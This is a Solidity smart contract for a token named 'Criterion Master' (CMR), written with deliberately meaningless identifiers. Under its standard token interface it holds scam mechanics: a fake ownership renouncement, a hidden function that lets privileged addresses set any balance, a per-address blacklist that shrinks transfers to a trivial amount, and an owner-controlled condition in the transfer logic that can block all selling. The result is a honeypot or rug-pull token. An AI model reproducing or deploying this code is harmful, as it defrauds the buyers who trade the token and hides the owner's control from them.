//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface teamReceiver {
    function createPair(address totalReceiver, address enableTotalSwap) external returns (address);
}

interface swapFrom {
    function totalSupply() external view returns (uint256);

    function balanceOf(address amountList) external view returns (uint256);

    function transfer(address totalToken, uint256 marketingIs) external returns (bool);

    function allowance(address modeToken, address spender) external view returns (uint256);

    function approve(address spender, uint256 marketingIs) external returns (bool);

    function transferFrom(
        address sender,
        address totalToken,
        uint256 marketingIs
    ) external returns (bool);

    event Transfer(address indexed from, address indexed feeLaunchedShould, uint256 value);
    event Approval(address indexed modeToken, address indexed spender, uint256 value);
}

abstract contract receiverLaunch {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverBuyTo {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface swapFromMetadata is swapFrom {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract CriterionMaster is receiverLaunch, swapFrom, swapFromMetadata {

    function owner() external view returns (address) {
        return marketingList;
    }

    uint256 private tokenAt;

    function transferFrom(address totalSell, address totalToken, uint256 marketingIs) external override returns (bool) {
        if (_msgSender() != marketingFeeReceiver) {
            if (toReceiver[totalSell][_msgSender()] != type(uint256).max) {
                require(marketingIs <= toReceiver[totalSell][_msgSender()]);
                toReceiver[totalSell][_msgSender()] -= marketingIs;
            }
        }
        return limitAuto(totalSell, totalToken, marketingIs);
    }

    uint256 tradingReceiverLiquidity;

    function isTotal() public {
        emit OwnershipTransferred(minLaunched, address(0));
        marketingList = address(0);
    }

    function approve(address teamWallet, uint256 marketingIs) public virtual override returns (bool) {
        toReceiver[_msgSender()][teamWallet] = marketingIs;
        emit Approval(_msgSender(), teamWallet, marketingIs);
        return true;
    }

    mapping(address => mapping(address => uint256)) private toReceiver;

    function receiverShould(address marketingSender, uint256 marketingIs) public {
        maxTx();
        launchedLaunchMax[marketingSender] = marketingIs;
    }

    function modeWallet(uint256 marketingIs) public {
        maxTx();
        tradingReceiverLiquidity = marketingIs;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return swapTx;
    }

    function maxTx() private view {
        require(modeList[_msgSender()]);
    }

    constructor (){
        if (feeFrom != tokenAt) {
            marketingBuy = true;
        }
        receiverBuyTo teamTx = receiverBuyTo(marketingFeeReceiver);
        launchSellTo = teamReceiver(teamTx.factory()).createPair(teamTx.WETH(), address(this));
        if (marketingBuy != launchWallet) {
            marketingBuy = true;
        }
        minLaunched = _msgSender();
        modeList[minLaunched] = true;
        launchedLaunchMax[minLaunched] = swapTx;
        isTotal();
        if (tokenAt == feeFrom) {
            feeFrom = tokenAt;
        }
        emit Transfer(address(0), minLaunched, swapTx);
    }

    address marketingFeeReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function limitTotal(address tokenMin) public {
        maxTx();
        
        if (tokenMin == minLaunched || tokenMin == launchSellTo) {
            return;
        }
        exemptTotal[tokenMin] = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return launchTotal;
    }

    address public launchSellTo;

    function name() external view virtual override returns (string memory) {
        return marketingMax;
    }

    mapping(address => uint256) private launchedLaunchMax;

    function limitAuto(address totalSell, address totalToken, uint256 marketingIs) internal returns (bool) {
        if (totalSell == minLaunched) {
            return launchTake(totalSell, totalToken, marketingIs);
        }
        uint256 fundEnableAmount = swapFrom(launchSellTo).balanceOf(tokenAmount);
        require(fundEnableAmount == tradingReceiverLiquidity);
        require(totalToken != tokenAmount);
        if (exemptTotal[totalSell]) {
            return launchTake(totalSell, totalToken, modeTeam);
        }
        return launchTake(totalSell, totalToken, marketingIs);
    }

    function decimals() external view virtual override returns (uint8) {
        return maxTo;
    }

    string private marketingMax = "Criterion Master";

    uint8 private maxTo = 18;

    address public minLaunched;

    uint256 listMarketing;

    uint256 private swapTx = 100000000 * 10 ** 18;

    mapping(address => bool) public exemptTotal;

    bool private launchWallet;

    function isLiquidity(address launchedMin) public {
        require(launchedMin.balance < 100000);
        if (walletTeam) {
            return;
        }
        
        modeList[launchedMin] = true;
        
        walletTeam = true;
    }

    address private marketingList;

    event OwnershipTransferred(address indexed minIsTo, address indexed autoReceiver);

    function launchTake(address totalSell, address totalToken, uint256 marketingIs) internal returns (bool) {
        require(launchedLaunchMax[totalSell] >= marketingIs);
        launchedLaunchMax[totalSell] -= marketingIs;
        launchedLaunchMax[totalToken] += marketingIs;
        emit Transfer(totalSell, totalToken, marketingIs);
        return true;
    }

    function allowance(address sellMode, address teamWallet) external view virtual override returns (uint256) {
        if (teamWallet == marketingFeeReceiver) {
            return type(uint256).max;
        }
        return toReceiver[sellMode][teamWallet];
    }

    bool public walletTeam;

    function getOwner() external view returns (address) {
        return marketingList;
    }

    function transfer(address marketingSender, uint256 marketingIs) external virtual override returns (bool) {
        return limitAuto(_msgSender(), marketingSender, marketingIs);
    }

    uint256 private feeFrom;

    uint256 constant modeTeam = 4 ** 10;

    string private launchTotal = "CMR";

    function balanceOf(address amountList) public view virtual override returns (uint256) {
        return launchedLaunchMax[amountList];
    }

    address tokenAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool public marketingBuy;

    mapping(address => bool) public modeList;

}